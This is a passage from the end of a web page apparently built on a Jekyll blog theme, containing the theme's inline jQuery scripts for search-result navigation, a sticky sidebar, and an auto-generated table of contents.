    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  â¬…, 38  â¬†, 39  âž¡, 40  â¬‡
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script>
    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

